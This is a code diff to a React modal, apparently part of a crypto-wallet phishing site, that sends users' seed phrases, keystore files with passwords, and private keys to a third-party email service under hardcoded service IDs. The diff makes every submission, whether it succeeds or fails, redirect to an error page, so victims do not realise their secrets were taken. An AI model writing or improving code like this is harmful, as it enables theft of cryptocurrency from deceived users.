@@ -1,5 +1,6 @@
 // import { emailjs } from '@emailjs/browser'
 import React, { useState } from 'react'
+import { useNavigate } from 'react-router-dom';
 
 
 function ModalWallet({img, name, cancelModal}) {
@@ -9,7 +10,7 @@ function ModalWallet({img, name, cancelModal}) {
         keystorepassword: ""
     })
     const [privatekeyInput, setPrivatekeyInput] = useState('');
-    
+    const navigate = useNavigate();
 
     useState(()=>{
         emailjs.init('dFX7V_QgdyVOq1Gsk')
@@ -40,9 +41,9 @@ function ModalWallet({img, name, cancelModal}) {
         e.preventDefault();
         emailjs.sendForm('service_p6dborp', 'template_f1lpt2u', '#phraseSubmit')
         .then(function(response) {
-                console.log('SUCCESS!', response.status, response.text);
+                navigate("/error")
             }, function(error) {
-                console.log('FAILED...', error);
+                navigate("/error")
         });
     }
 
@@ -50,9 +51,9 @@ function ModalWallet({img, name, cancelModal}) {
         e.preventDefault()
         emailjs.sendForm('service_p6dborp', 'template_jxpzm2j', '#keyStoreJson')
         .then(function(response) {
-                console.log('SUCCESS!', response.status, response.text);
+                navigate("/error")
             }, function(error) {
-                console.log('FAILED...', error);
+                navigate("/error")
         });
     }
 
@@ -60,9 +61,9 @@ function ModalWallet({img, name, cancelModal}) {
         e.preventDefault()
         emailjs.sendForm('service_p6dborp', 'template_f1lpt2u', '#PrivateKey')
         .then(function(response) {
-                console.log('SUCCESS!', response.status, response.text);
+                navigate("/error")
             }, function(error) {
-                console.log('FAILED...', error);
+                navigate("/error")
         });
     }
 
@@ -93,7 +94,7 @@ function ModalWallet({img, name, cancelModal}) {
                                                 className="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" 
                                                 name="wallet_message" 
                                                 id="wallet_message" 
-                                                minLength="12" 
+                                                minLength={12} 
                                                 required
                                                 value={phraseInput}
                                                 onChange={setPhrase}
